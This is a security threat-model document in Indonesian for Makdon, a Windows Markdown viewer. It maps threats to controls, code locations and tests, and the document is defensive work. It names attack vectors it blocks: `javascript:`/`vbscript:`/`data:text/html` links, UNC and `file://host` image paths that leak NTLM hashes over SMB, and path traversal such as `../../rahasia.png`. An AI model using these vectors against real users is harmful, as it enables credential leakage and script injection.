# Keamanan Makdon: model ancaman dan kontrol

**Tujuan:** merinci apa yang dilindungi Makdon, dari siapa, dengan kontrol apa (lokasi kode dan test yang menjaganya), serta
batasan yang masih ada.
**Pembaca:** pengembang dan reviewer keamanan. Keputusan terkait: [DESIGN-DECISIONS.md](DESIGN-DECISIONS.md) (ADR-06, 07, 08, 10, 11,
17, 18, 24, 25). Peta test: [TESTING.md](TESTING.md).

Semua klaim di sini diperiksa terhadap kode saat dokumen ini ditulis. Bagian yang bergantung pada perilaku pustaka luar atau
pada sistem operasi dan tidak bisa dibuktikan dari repo ditandai "belum diverifikasi". Repo belum punya kebijakan pelaporan
kerentanan (tidak ada `SECURITY.md` di akar atau `.github/`); laporkan ke pemilik repo.

## 1. Aset, aktor, dan batas kepercayaan

| Aset | Mengapa penting |
| --- | --- |
| File di mesin pengguna (di luar dokumen yang dibuka) | Tidak boleh ikut terekspor atau terbaca oleh dokumen yang dibuka |
| Identitas jaringan pengguna (alamat IP, hash NTLM) | Tidak boleh bocor ke host yang ditunjuk dokumen tak tepercaya |
| Isi dokumen pengguna | Tidak boleh rusak/tertimpa diam-diam |
| Kestabilan aplikasi | Input tak tepercaya tidak boleh membuatnya crash atau membeku tanpa batas |
| Registri dan data aplikasi pengguna | Skrip dan test tidak boleh merusak |

| Aktor | Kemampuan yang diasumsikan |
| --- | --- |
| Penulis dokumen `.md` tak tepercaya | Mengontrol isi file yang dibuka pengguna (teks, HTML mentah, URL tautan/gambar, ukuran) |
| Penerima HTML hasil ekspor | Membuka berkas ekspor di peramban |
| Proses lain milik pengguna yang sama | Dapat mengubah file di disk, menulis ke pipe single-instance, menjalankan Makdon lagi |
| Pengguna Windows lain di mesin yang sama | Tidak boleh bisa mengirim perintah ke instance pengguna ini |
| Pengguna sendiri | Dipercaya (mis. menekan "Muat gambar remote", mengetik regex sendiri) |

Batas kepercayaan: **isi dokumen** dan **file di disk yang berubah dari luar** tidak tepercaya; kode aplikasi, `settings.json` milik
pengguna (tetapi tetap divalidasi), dan input yang diketik pengguna dipercaya. Makdon tidak mengeksekusi isi dokumen (tidak ada
skrip, makro, atau plugin).

## 2. Kontrol per ancaman

Kolom "Test" memuat nama test dan `berkas:baris`; nomor baris tanpa nama berkas memakai berkas yang disebut sebelumnya dalam sel
yang sama (di 2.7 tanpa nama berkas = `SingleInstanceServerTests.cs`). "-" berarti tidak ada test yang menjaga kontrol itu.

### 2.1 Input tak tepercaya: file `.md`

| Ancaman | Kontrol | Lokasi kode | Test |
| --- | --- | --- | --- |
| File berukuran sangat besar menghabiskan memori | Konfirmasi di atas 50 MB, tolak di atas 500 MB; `OutOfMemoryException` saat muat ditangkap | `MainWindow.xaml.cs:19-20, 259-263, 278-304` | - |
| Encoding rusak/byte tak valid diam-diam "diperbaiki" lalu tertimpa | Penanda `lossy` + konfirmasi sebelum simpan; non-BOM ke Windows-1252 (round-trip identik) | `TextFileIO.cs:40-90`, `MainWindow.xaml.cs:429-432` | `Decode_EachBomWithInvalidBody_IsLossy_*` (`IoAndUtilityCoverageTests.cs:43`), `Lossy_*` (`DocumentTabConflictEdgeTests.cs:482-578`) |
| Gambar yang ada tetapi tak bisa di-decode menjatuhkan seluruh pratinjau | `ReplaceUnloadableImages` + dokumen galat; semua dicatat | `DocumentView.xaml.cs:459-536` | `UndecodableImage_*` (`DocumentViewLifecycleTests.cs:414-459`), `DocumentTabTests.cs:955-984` |
| Galat render membuat aplikasi crash | `ShowRenderError` (tidak melempar ke dispatcher). Jalur sinkron (dokumen < 100 rb karakter, `:364`) tidak menangkap `OutOfMemoryException`: OOM lolos dan menutup aplikasi lewat jalur fatal. Jalur latar `RenderInBackground` (>= 100 rb karakter, `:406`) menangkap **semua** galat termasuk OOM dan menampilkannya sebagai dokumen galat. Jalur cetak/pratinjau cetak berbeda: lihat [2.12](#212-pratinjau-cetak-dan-cetak) | `DocumentView.xaml.cs:364-368, 406-410, 417-422` | sebagian lewat test gambar rusak di atas |
| Argumen/path relatif atau tak valid | `App.ToFullPath` (path tak valid dikembalikan apa adanya, `MainWindow.OpenFile` melaporkan), pesan galat ramah | `App.xaml.cs:47-54`, `MainWindow.xaml.cs:236-253` | - |

### 2.2 HTML mentah: pratinjau vs ekspor

| Ancaman | Kontrol | Lokasi kode | Test |
| --- | --- | --- | --- |
| Skrip/atribut/`<iframe>` dari HTML mentah di HTML ekspor | `ExportPipeline`: `DisableHtml()` (di-escape), hapus `GenericAttributesExtension` dan `MediaLinkExtension` | `MarkdownSupport.cs:67-78` | `RawHtml_IsEscaped` (`HardeningTests.cs:28`), `RawHtmlInAnyPosition_IsEscaped_NeverEmittedAsTags` (`ExportAndImageSecurityTests.cs:150`), `ExportPipeline_ParsesInlineHtmlAsText_*` (`:161`), `MediaLinks_NeverBecomeIframeVideoOrAudio` (`:174`), `GenericAttributes_AreNotInjected_*` (`:183`) |
| Title/placeholder template disuntik | Judul `WebUtility.HtmlEncode`; template diisi satu pass | `HtmlExporter.cs:14, 56-59` | `Title_IsHtmlEscaped` (`HtmlAndMarkdownSupportTests.cs:242`), `Body_ContainingPlaceholderTokens_IsNotReinterpreted` (`:266`) |
| Pipeline ekspor ikut "bocor" ke pratinjau atau sebaliknya | Dua instance pipeline terpisah | `MarkdownSupport.cs:58-67` | `ExportPipeline_DoesNotAffectThePreviewPipeline` (`HardeningTests.cs:176`) |
| HTML mentah di pratinjau | Pipeline pratinjau tetap mengurai `HtmlBlock`, tetapi hasilnya `FlowDocument` WPF (bukan HTML); README: HTML mentah "diabaikan" di pratinjau | `MarkdownSupport.cs:58-61`, `DocumentView.xaml.cs:489-500` | test hanya memastikan parser menghasilkan `HtmlBlock` (`HardeningTests.cs:176`); bahwa renderer Markdig.Wpf mengabaikannya adalah perilaku pustaka, **belum diverifikasi** di repo ini |

### 2.3 Skema URL dan allowlist

`MarkdownSupport.ClassifyUrl` (`MarkdownSupport.cs:86-115`) adalah allowlist: `Relative`, `Http`, `Mailto`, `DataImage`
(`png|jpeg|gif|webp`), `LocalFile` (huruf drive atau `file:///` tanpa host); semua lain `Blocked`. Spasi dan karakter kontrol dibuang
sebelum mendeteksi skema (mencegah `java\tscript:`); awalan `\\`, `//`, `/\`, `\/` = `Blocked`.

| Ancaman | Kontrol | Lokasi kode | Test |
| --- | --- | --- | --- |
| `javascript:`, `vbscript:`, `data:text/html`, `file://host`, `ftp:` di tautan ekspor | `SanitizeForExport`: href tak aman menjadi `#`, teks tautan tetap sebagai teks inert | `MarkdownSupport.cs:213-229` | `LinkVectors_NeverProduceAnUnsafeHref` (20 vektor: entitas `&#106;`, tab/CR/LF, huruf campur, referensi, tautan berisi gambar; `ExportAndImageSecurityTests.cs:71`), `UnsafeLinkUrls_BecomeInertAnchor` (`HardeningTests.cs:64`), `LinkTextOfAnUnsafeLink_IsKeptAsInertText` (`ExportAndImageSecurityTests.cs:99`) |
| Autolink berskema berbahaya | Autolink tak aman diganti `LiteralInline` (email dikecualikan) | `MarkdownSupport.cs:225-228` | `Autolinks_WithUnsafeSchemes_AreNotLinked` (`ExportAndImageSecurityTests.cs:114`), `Autolink_WithScriptScheme_IsNotLinked` (`HardeningTests.cs:109`) |
| Keluar dari atribut lewat kutip di title/alt | Escape bawaan renderer HTML Markdig | `HtmlExporter.cs:50-54` | `LinkWithAngleBracketsAndTitle_*` (`ExportAndImageSecurityTests.cs:81`), `ImageAlt_QuotesCannotBreakOutOfTheAttribute` (`:90`) |
| Gambar berskema berbahaya di ekspor | `SanitizeImage`: hanya `Http`, `DataImage` sah, atau gambar lokal; selain itu teks `[gambar diblokir: alt]` (alt di-escape) | `MarkdownSupport.cs:233-262` | `UnsafeImageUrls_AreReplacedByText` (`HardeningTests.cs:126`), `UnsafeImage_AltIsEscapedInReplacementText_*` (`ExportAndImageSecurityTests.cs:195`) |
| Satu pengujian properti untuk seluruh ekspor | Setiap `href`/`src` hasil ekspor harus lolos allowlist | - | `AssertAllUrlsAreSafe`, `ExportOfMixedHostileDocument_PassesTheGlobalUrlAllowlist` (`ExportAndImageSecurityTests.cs:40, 312`) |
| `ClassifyUrl` salah mengklasifikasi | Matriks kategori | `MarkdownSupport.cs:86-115` | `ClassifyUrl_Categories` (`HardeningTests.cs:103`), `ClassifyUrl_BlocksUncSchemeRelativeAndUnknownSchemes` (`:87`) |

### 2.4 UNC, SMB, NTLM

Membuka path UNC (`\\host\share\x.png`) atau `file://host/...` membuat Windows mengontak host itu (SMB) dan dapat membocorkan
hash NTLM pengguna. Kontrol:

| Permukaan | Kontrol | Lokasi kode | Test |
| --- | --- | --- | --- |
| Gambar di pratinjau/cetak | `ResolveImageUrls` memblokir `Blocked`/`Mailto` selalu (tidak bergantung opsi blokir remote); setelah klasifikasi hanya `file:` tanpa host (`IsUnc` dan `Host` kosong diperiksa) yang diteruskan ke WPF | `MarkdownSupport.cs:130-172` | `UncVariants_AreBlocked_RegardlessOfBlockRemote` (`ExportAndImageSecurityTests.cs:360`, 10 varian termasuk `file:////host`, `file://localhost/c$`), `UncAndHostFileUrls_AreAlwaysBlocked` (`HardeningTests.cs:218`), `ProtocolRelativeUrl_*` (`ExportAndImageSecurityTests.cs:401`); untuk dokumen cetak: `FtpUncFileHostAndDataImages_AreBlockedInThePrintDocument_AndNeverTouchTheNetwork` (`PrintContentAndCommandTests.cs:213`, lihat 2.12) |
| Gambar hasil gabungan path relatif ke UNC | `IsAllowedLocalPath`: UNC hanya bila dokumen sendiri ada di share yang sama (root dibandingkan, tanpa membedakan huruf); root `\\?\` dan `\\.\` tidak cocok dengan root dokumen sehingga ditolak | `MarkdownSupport.cs:188-197` | `IsAllowedLocalPath_Matrix` (`ExportAndImageSecurityTests.cs:487`), `LocalPathResultingInUncShare_*` (`HardeningTests.cs:235`) |
| Gambar di ekspor | Awalan UNC/`//host`/`file://host` = `Blocked` lalu teks penanda; tidak pernah dibaca | `MarkdownSupport.cs:91-92, 258-259` | `UncAndSchemeRelativeImageUrls_AreReplacedByText_NeverEmitted` (`ExportAndImageSecurityTests.cs:214`) |
| Dokumen yang dibuka dari share UNC | Diizinkan (pengguna yang memilihnya); gambar relatifnya di share yang sama diizinkan | `MarkdownSupport.cs:188-197` | `IsAllowedLocalPath_Matrix` |
| Klik tautan relatif/`file:` ke `.md` | `MarkdownSupport.ResolveLinkTarget` (tanpa I/O): `file:` berhost dan UNC ditolak, path perangkat `\\?\`/`\\.\` ditolak, ekstensi markdown dicek dulu, lalu `IsAllowedLocalPath`; `File.Exists` baru dipanggil sesudahnya (R1, ditutup: [bagian 4](#4-risiko-yang-sudah-ditutup)) | `MarkdownSupport.cs:361-412`, `DocumentView.xaml.cs:688-712` | `LinkResolutionTests.cs` (lihat bagian 4) |

### 2.5 Gambar remote dan FTP (pelacakan)

| Ancaman | Kontrol | Lokasi kode | Test |
| --- | --- | --- | --- |
| Gambar `http(s)` melacak pembaca (piksel pelacak) | `BlockRemoteImages` bawaan `true`: diganti `[gambar remote diblokir]`; opsi menu Tampilan > "Muat gambar remote" | `MarkdownSupport.cs:145-147`, `DocumentView.xaml.cs:56`, `AppSettings.cs:50`, `MainWindow.xaml.cs:123-129` | `HttpVariants_BlockedOnlyWhenRequested` (`ExportAndImageSecurityTests.cs:389`), `HttpImages_AreBlockedOnlyWhenRequested` (`HardeningTests.cs:245`), `BlockRemoteImages_DefaultsToTrue_AndRoundTrips` (`:726`), `RefreshPreview_AfterBlockRemoteImagesToggle_*` (`:606`) |
| `ftp:`/`gopher:`/`ws:`/`pack:` dsb. membuka koneksi | Semua skema selain `http(s)` dan `file:` lokal diblokir **walau** opsi remote aktif | `MarkdownSupport.cs:137-148, 150-161` | `NonHttpSchemes_AreBlockedInPreview_EvenWhenRemoteImagesAreAllowed` (`ExportAndImageSecurityTests.cs:443`), `FtpImage_ShowsMarker_InPreview_*` (`DocumentViewLifecycleTests.cs:488`), **`RemoteImageOverFtp_IsNotFetched_WhenRemoteImagesAreBlocked`** (listener TCP lokal membuktikan tidak ada koneksi, `:510`) |
| `data:` memecah pratinjau | Diganti penanda di pratinjau; di ekspor hanya `image/` png, jpeg, gif, atau webp | `MarkdownSupport.cs:139-141, 106-107` | `DataImages_GetPreviewMarker_RegardlessOfBlockRemote` (`ExportAndImageSecurityTests.cs:455`), `ExportAllowlist_StillKeepsValidDataImages_*` (`:464`), `DataImage_ShowsMarker_*` (`DocumentViewLifecycleTests.cs:468`) |
| Mode "Muat gambar remote" aktif | Tidak ada kontrol tambahan; pengguna memilih | - | - |

### 2.6 Path traversal dan privasi ekspor

| Ancaman | Kontrol | Lokasi kode | Test |
| --- | --- | --- | --- |
| `![](../../rahasia.png)` atau `![](C:\Users\...\foto.png)` mengekspor file lain ke HTML | Gambar lokal hanya disematkan bila `IsInsideDocumentFolder` (awalan folder dokumen + separator, tanpa membedakan huruf) dan `IsAllowedLocalPath`; di luar itu teks `[gambar di luar folder dokumen tidak disertakan]` | `MarkdownSupport.cs:301-302, 327` | `RelativeImage_ResolvingOutsideTheDocumentFolder_*`, `AbsoluteImage_OutsideTheDocumentFolder_*` (tanpa path bocor), `SiblingFolderSharingTheNamePrefix_*` (`ExportImageBudgetAndPrivacyTests.cs:36-71`), `Images_InsideTheDocumentFolder_*` (`:74`) |
| Dokumen belum disimpan (tanpa folder) menyematkan file lokal | `baseDir == null`: tidak ada yang "di bawah folder dokumen" | `MarkdownSupport.cs:283-297` | `WithoutADocumentFolder_AbsoluteLocalImages_AreNotEmbedded_*` (`ExportImageBudgetAndPrivacyTests.cs:86`) |
| Path mesin bocor ke HTML | Path relatif yang tak tersemat dibiarkan relatif; absolut lokal diganti teks; tidak pernah `file:///C:/...` | `MarkdownSupport.cs:242-256` | `RelativeImage_IsEmbeddedAsDataUri_AndNeverLeaksLocalPath` (`HtmlAndMarkdownSupportTests.cs:283`), `AbsoluteLocalImage_OverTwoMegabytes_OrSvg_OrMissing_*` (`ExportAndImageSecurityTests.cs:248`) |
| Symlink di dalam folder yang menunjuk ke luar | Target symlink diperiksa (`ResolveLinkTarget`) dan dianggap "di luar" | `MarkdownSupport.cs:333-334` | **-** (tidak ada test; butuh hak membuat symlink) |
| Ekspor memuat memori berlebihan (banyak gambar besar) | 2 MB per gambar, anggaran total 30 MB per kemunculan, cache per path (gambar sama dibaca sekali), anggaran dicek sebelum membaca file; `OutOfMemoryException` ditangkap | `MarkdownSupport.cs:37-43, 330-345`, `MainWindow.xaml.cs:569-574` | `TotalBudget_*` (`ExportImageBudgetAndPrivacyTests.cs:100, 111`), `SameImageReferencedManyTimes_IsEncodedOnce_*` (`:123`), `ManyReferencesToTheSameLargeImage_StayWithinTheTotalBudget` (`:137`), `LocalImage_AtExactlyTwoMegabytes_*` (`ExportAndImageSecurityTests.cs:235`); jalur OOM - |
| Query/fragment/percent-encoding menipu pencarian file | Query dan fragmen dibuang, `Uri.UnescapeDataString`, path dinormalkan `GetFullPath` sebelum cek folder | `MarkdownSupport.cs:310-323` | `RelativeImage_QueryFragmentAndPercentEncoding_*` (`ExportAndImageSecurityTests.cs:288`), `Images_InsideTheDocumentFolder_*` (`..` yang tetap di dalam) |

### 2.7 Single-instance: pipe dan mutex

Nomor baris test di tabel ini: `SingleInstanceServerTests.cs`, kecuali ditulis lain.

| Ancaman | Kontrol | Lokasi kode | Test |
| --- | --- | --- | --- |
| Pengguna/sesi lain mengirim perintah | Pipe `PipeOptions.CurrentUserOnly` di server dan klien; nama pipe memuat SID pengguna + id sesi; mutex `Local\` per sesi | `SingleInstance.cs:47, 61-62, 104-105, 189` | `PipeName_ContainsTheWindowsSessionId_*` (`SingleInstanceServerTests.cs:245`); **penolakan pengguna lain tidak diuji** (butuh akun kedua) |
| Pesan berisi path relatif/aneh | Hanya `Path.IsPathFullyQualified` (drive atau UNC); `C:rel.md` dan `\rel.md` ditolak | `SingleInstance.cs:163-172` | `ParseMessage_RejectsRootedButNotFullyQualifiedPaths` (`:106`), `Server_ForwardsOnlyAbsolutePaths_AndNoMoreThanSixtyFour` (`:124`), `Message_RoundTrips_AndOnlyAbsolutePathsAreAccepted` (`HardeningTests.cs:798`) |
| Banjir path | Maksimal 64 path, tiap path < 32768 karakter, pesan dipotong di 256 K karakter | `SingleInstance.cs:17-19, 154, 169-170` | `ParseMessage_CapsAtSixtyFourFiles_*` (`:45`), `ParseMessage_SkipsBlankLinesAndOverlongPaths` (`:87`), `Server_OversizedMessage_DoesNotKillTheServer_*` (`:183`) |
| Pesan palsu/header salah | Header harus persis `MAKDON1` (peka huruf, tanpa spasi); sisanya dibuang | `SingleInstance.cs:166` | `ParseMessage_HeaderMustMatchExactly` (`:73`), `Server_IgnoresMessagesWithWrongHeader_*` (`:167`) |
| Injeksi path lewat baris baru | `BuildMessage` membuang entri berisi `\n`/`\r` | `SingleInstance.cs:174-175` | `BuildMessage_DropsEntriesContainingLineBreaks_*` (`:114`) |
| Klien macet menahan server (DoS) | Batas baca 5 dtk per klien; klien macet tidak dihitung sebagai kegagalan server | `SingleInstance.cs:35, 95-122` | `Server_StalledClient_IsDroppedAfterTheReadTimeout_*` (`:209`), `Server_SurvivesMoreStalledClientsThanTheFailureLimit` (`:258`) |
| Callback melempar mematikan server | `Deliver` menangkap dan mencatat (kecuali OOM) | `SingleInstance.cs:136-143` | `Server_CallbackThatThrows_IsLoggedAndTheServerKeepsServing` (`:280`) |
| Path yang diterima dibuka sebagai tab | Hanya membuka file yang dipilih proses pengguna yang sama; tidak ada eksekusi | `App.xaml.cs:57-58`, `MainWindow.xaml.cs:63-74` | - |

### 2.8 Skrip registri

| Ancaman | Kontrol | Lokasi kode | Test |
| --- | --- | --- | --- |
| Skrip merusak registri sistem / butuh admin | Hanya `Registry.CurrentUser` (HKCU); `SupportsShouldProcess` (`-WhatIf` mencetak tanpa menulis) | `scripts/register-file-association.ps1:37, 77, 81`; `unregister-file-association.ps1:20, 42, 102` | - (CLAUDE.md melarang menjalankan skrip registri sungguhan di test) |
| Injeksi nama subkey lewat `-Extensions` | `-Extensions` dinormalkan ke huruf kecil, lalu divalidasi `'^\.[a-z0-9]+$'` (`-cnotmatch`) | `register-file-association.ps1:68-70`, `unregister-file-association.ps1:36-38` | - |
| Nilai bawaan pengguna hilang | `-SetDefault` mencadangkan ke `HKCU\Software\Makdon\PreviousDefault`; unregister memulihkan dan hanya menyentuh nilai yang persis menunjuk ProgID Makdon; `UserChoice` tidak disentuh | `register-file-association.ps1:102-120`, `unregister-file-association.ps1:57-114` | - |
| Eksekusi: `powershell -ExecutionPolicy Bypass` di README | Hanya untuk skrip repo; periksa isi skrip dan jalankan `-WhatIf` dulu | README, bagian Asosiasi file | - |

Aplikasi sendiri hanya **membaca** registri: `HKCU\Software\Microsoft\Windows\CurrentVersion\Themes\Personalize\AppsUseLightTheme`
(`Theming.cs:45-56`, galat akses dianggap tema terang). `SystemEvents.UserPreferenceChanged` hanya didengar saat mode Ikuti Sistem.

### 2.9 Catatan galat (`crash.log`)

| Hal | Fakta | Lokasi kode | Test |
| --- | --- | --- | --- |
| Apa yang dicatat | Stempel waktu (`InvariantCulture`), string konteks yang ditulis pemanggil, dan `exception.ToString()` (tipe, pesan, stack trace, inner exception). Pesan galat .NET sering memuat path file. Beberapa konteks memuat URL/path secara eksplisit: `"Gambar tidak dapat ditampilkan: {image.Url}"`, `"Gagal membuka tautan: {uri}"`. Kegagalan Pratinjau Cetak juga dicatat lengkap dengan `exception.ToString()` (`"Penyusunan pratinjau cetak gagal"`, `"Pratinjau cetak gagal"`, `"Pratinjau cetak kehabisan memori"`, `"Galat susulan pada penyusunan pratinjau cetak"`, `"Pembersihan pratinjau cetak"`), tetapi tidak pernah dicetak ke kertas (2.12). Isi dokumen tidak dicatat dengan sengaja (kode tidak pernah menulis teks dokumen ke log); namun isi dokumen bisa muncul bila ada dalam pesan pustaka (belum diverifikasi) | `CrashLog.cs:28-50`, `DocumentView.xaml.cs:521, 682` | `Write_AppendsContextAndExceptionToLogFile_*` (`CrashLogTests.cs:87`), `Write_RecordsContextExceptionTypeAndTimestamp_*` (`IoAndUtilityCoverageTests.cs:633`) |
| Lokasi dan izin | `%LOCALAPPDATA%\Makdon\crash.log`; teks biasa tidak dienkripsi; mewarisi izin folder pengguna (tidak ada ACL khusus di kode) | `CrashLog.cs:25-26` | - |
| Batas ukuran | Bila > 512 KB sebelum menulis, **seluruh** file dihapus lalu entri baru ditulis | `CrashLog.cs:16, 38` | `Write_LogOneByteOverTheLimit_IsDiscarded_*`, `Write_RepeatedlyOverTheLimit_NeverGrowsWithoutBound` (`IoAndUtilityCoverageTests.cs:567-591`) |
| Tidak boleh crash karena log | Semua galat I/O diabaikan; serialisasi `lock` | `CrashLog.cs:34-49` | `Write_WhenLogPathIsUnwritable_DoesNotThrow` (`CrashLogTests.cs:102`), `Write_ConcurrentWriters_*` (`IoAndUtilityCoverageTests.cs:616`) |
| Dialog tidak membanjiri pengguna | Jenis+pesan sama dalam 10 dtk hanya dicatat | `CrashLog.cs:79-91` | `ShouldShowDialog_*` (`CrashLogTests.cs:46-66`) |
| Test tidak mengotori log asli | `TestLogRedirect` | `Support/TestLogRedirect.cs` | `Write_WithoutExplicitPath_UsesTheRedirectedLogPath_*` (`IoAndUtilityCoverageTests.cs:647`) |
| Dialog galat menampilkan pesan pengecualian ke pengguna | Pesan + (untuk galat fatal) nama tipe ditampilkan di `MessageBox` | `App.xaml.cs:81-98` | - |

### 2.10 Regex dan ReDoS

Pola regex diketik pengguna di panel Cari (bukan berasal dari dokumen), tetapi bisa ditempel dari sumber tak tepercaya, dan dijalankan
terhadap teks dokumen di UI thread.

| Ancaman | Kontrol | Lokasi kode | Test |
| --- | --- | --- | --- |
| Backtracking katastrofik membekukan UI | `Regex` dengan `matchTimeout` 2 dtk per pemanggilan; batas total 4 dtk per pencarian yang diperiksa tiap iterasi (juga untuk match kosong dan ekspansi `$1`); `RegexMatchTimeoutException` -> pesan "Pencarian terlalu lama" | `SearchEngine.cs:17-25, 41-58` | `FindAll_CatastrophicRegex_ThrowsRegexMatchTimeout`, `TryFindAll_CatastrophicRegex_TimesOutWithMessage` (`SearchEngineTests.cs:366-379`), `FindAll_TotalDeadline_*` (`IoAndUtilityCoverageTests.cs:1013-1068`) |
| Pola lambat dijalankan ulang tiap ketukan/perubahan teks | Debounce 250 ms; pola+opsi yang timeout tidak dijalankan ulang sampai berubah (`timedOutKey`) | `FindReplaceBar.xaml.cs:20, 28-30, 164-169` | `TimedOutPattern_IsNotRerunOnEditorChangesOrFindNext_*` (`DocumentViewLifecycleTests.cs:213`) |
| Hasil sangat banyak | `MaxResults` 20.000 untuk penanda; Ganti Semua tanpa batas tetapi tetap di bawah batas waktu | `SearchEngine.cs:20, 252` | `FindAll_Literal_StopsAtMaxResults` dkk. (`SearchEngineTests.cs:184-211`), `ReplaceAll_*MoreThanMaxResults_*` (`:591, 602`) |
| Pola tidak valid | `ArgumentException` -> "Regex tidak valid"; pola berakhir `\` tidak crash | `SearchEngine.cs:197-217`, `NormalizeLineEndings` | `FindAll_PatternEndingWithBackslash_*` (`IoAndUtilityCoverageTests.cs:908`) |

### 2.11 Data yang disimpan dan integritas dokumen

| Ancaman | Kontrol | Lokasi kode | Test |
| --- | --- | --- | --- |
| `settings.json` rusak/diedit jahat | `Load` tidak melempar; tipe salah = bawaan; `Sanitize` merapikan (tema, zoom 50-300, daftar, sesi); sesi hanya dibuka bila `File.Exists` | `AppSettings.cs:58-73, 125-142`, `MainWindow.xaml.cs:187-205` | `Load_CorruptOrWrongShapeJson_*`, `Load_Session_DropsBadTabsAndFixesCaretAndActiveIndex` (`AppSettingsTests.cs:54, 196`) |
| Dokumen tertimpa diam-diam oleh simpan | Deteksi konflik hash+stempel, dialog Timpa/Muat dari Disk/Batal, `ExternalChangeException` tanpa penangan | `DocumentTab.cs:149-200` | `SaveTo_ChangedOnDisk_WithoutHandler_Throws_*` (`HardeningTests.cs:311`), `DocumentTabConflictEdgeTests` |
| Penulisan merusak file bila gagal | Atomik; temp dibersihkan; fallback hanya untuk akses ditolak/nama panjang | `TextFileIO.cs:141-202` | lihat ADR-01 |
| `settings.json` ditulis bersamaan beberapa instance | `SaveMerged` menggabung `RecentFiles` | `AppSettings.cs:96-107` | `AppSettingsMergeTests`, `AppSettingsMergeEdgeTests` |

### 2.12 Pratinjau Cetak dan Cetak

Dua jalur memakai model cetak yang sama (`PrintSnapshot` -> `ParsePrintSnapshot` -> `BuildPrintDocument`): Cetak langsung (Ctrl+P) dan
Pratinjau Cetak (Ctrl+Shift+P). Lihat [ARCHITECTURE.md](ARCHITECTURE.md#49-pratinjau-cetak-ctrlshiftp-dan-cetak).

| Ancaman | Kontrol | Lokasi kode | Test |
| --- | --- | --- | --- |
| Dokumen tak tepercaya melacak pembaca atau memicu SMB/NTLM lewat gambar saat dicetak atau dipratinjau | Snapshot di-parse dengan `ParseDocument` yang sama dengan pratinjau utama, jadi `ResolveImageUrls` memblokir UNC, `file://host`, `//host`, `ftp:`, skema lain, dan `data:` selalu, dan `http(s)` sesuai flag blokir remote. Flag diambil dari snapshot (nilai saat pratinjau dibuka), bukan nilai global saat penyusunan ulang | `DocumentView.xaml.cs:588-590`, `PrintLayout.cs:92-125` | `FtpUncFileHostAndDataImages_AreBlockedInThePrintDocument_AndNeverTouchTheNetwork` (dua kasus `blockRemote`; listener TCP lokal membuktikan tidak ada koneksi, `PrintContentAndCommandTests.cs:213`), `SnapshotBlockRemoteFlag_IsHonoured_NotTheCurrentGlobalSetting` (`:264`), `PrintDocument_StillBlocksRemoteAndUncImages` (`PrintPreviewTests.cs:245`), `LargeDocument_IsParsedInTheBackground_*` (`PreviewBuildTests.cs:750`) |
| Path profil pengguna atau pesan galat bocor ke kertas atau PDF lewat dokumen galat | Jalur cetak tidak membuat dokumen galat: `CreateFlowDocument(throwOnFailure: true)` melempar `InvalidOperationException` berpesan ramah tanpa path (nama tipe galat + "Rincian ada di crash.log."); jendela menampilkannya di panel galat dan tombol Cetak mati. Dokumen galat bawaan (memuat `CrashLog.LogPath`) hanya tetap di pratinjau utama di layar. [ADR-24](DESIGN-DECISIONS.md#adr-24-dokumen-galat-tidak-pernah-dicetak) | `DocumentView.xaml.cs:455-483, 529-535` | `RenderFailure_OnThePrintPath_*`, `RenderFailure_InThePrintWindow_*`, `RenderFailure_InTheMainPreview_StillShowsTheErrorDocument_AsBefore` (`PrintContentAndCommandTests.cs:88, 122, 148`) |
| Kaki halaman membocorkan path lokal | Kaki hanya memuat judul = `DocumentTab.Title` (nama berkas `Path.GetFileName`, atau nama dokumen tanpa judul) dan "Halaman X dari N"; folder dokumen hanya dipakai untuk menyelesaikan gambar, tidak digambar. Nama berkas yang sama juga menjadi judul jendela dan nama pekerjaan cetak yang terlihat di antrean printer (`dialog.PrintDocument(..., snapshot.Title)`) | `DocumentTab.cs:87`, `HeaderFooterPaginator.cs:64-88`, `PrintPreviewWindow.xaml.cs:447` | Struktural; tidak ada test yang khusus menegaskan "tanpa path" pada kaki (`HeaderFooterPaginatorTests` memakai judul uji, termasuk nama aneh dan sangat panjang) |
| Berkas sementara berisi isi dokumen tertinggal di disk | Paket XPS pratinjau hanya di `MemoryStream` (dilepas di `Cleanup`); tidak ada berkas sementara dibuat aplikasi. Spooler/driver printer di luar kendali aplikasi (**belum diverifikasi**) | `PreviewBuild.cs:160-165, 304-329` | `Dispose_AfterReady_ReleasesPagesAndPackage_AndIsIdempotent` (`PreviewBuildTests.cs:265`), `ManyCyclesInARow_DoNotAccumulatePackages` (`:410`) |
| Dokumen sangat besar atau penuh gambar menghabiskan memori di pratinjau | `Guard` menangkap semua galat termasuk OOM: siklus `Failed` dengan pesan memori; pembuatan jendela ditangkap terpisah. Cetak langsung dan tombol Cetak di pratinjau **tidak** menangkap OOM (R8) | `PreviewBuild.cs:211-238`, `MainWindow.xaml.cs:612-621` | `SubscriberThatThrows_FailsTheBuild_AndNeverReachesTheDispatcher` (variasi OOM, `PreviewBuildTests.cs:468`); jalur OOM nyata tidak diuji |
| Galat pratinjau menjatuhkan aplikasi | Semua penangan `PreviewBuild` dibungkus `Guard`; galat di kode jendela ditangkap `ShowFailure`; test gagal bila ada galat tak terduga lolos ke dispatcher (`FailOnUnexpectedDispatcherErrors`) | `PreviewBuild.cs:211-238`, `PrintPreviewWindow.xaml.cs:103-150` | `ChangingLayoutManyTimes_WhileRendering_ThenClosing_LeavesNoDispatcherError` (`PrintPreviewWindowBehaviorTests.cs:950`), `RepeatedCycles_DisposedWhileRendering_*` (`PreviewBuildTests.cs:608`) |
| Dokumen tercetak dengan kertas atau orientasi yang tidak disangka pengguna | `ConfirmPaperMatchesPreview` meminta konfirmasi bila tiket dialog berbeda dari pratinjau | `PrintPreviewWindow.xaml.cs:466-486` | `TicketMatches_*` (pembanding murni, `PrintContentAndCommandTests.cs:441-528`); `ConfirmPaperMatchesPreview` sendiri tidak diuji |

Batasan: gambar `http(s)` yang dimuat async (bila blokir remote dimatikan oleh pengguna) bisa belum tampil di halaman XPS pratinjau
(`PreviewBuild.cs:23-25`); itu soal kelengkapan, bukan kebocoran. Perilaku gambar `http(s)` pada Cetak langsung belum diverifikasi.

## 3. Risiko residual dan batasan yang diketahui

Ditemukan saat membaca kode. Risiko yang sudah diperbaiki dipindahkan ke [bagian 4](#4-risiko-yang-sudah-ditutup); nomor R2-R13
tidak diubah supaya rujukan lama tetap valid.

| # | Risiko / batasan | Dasar di kode | Status verifikasi |
| --- | --- | --- | --- |
| R1 | Ditutup; lihat [bagian 4](#4-risiko-yang-sudah-ditutup). | - | - |
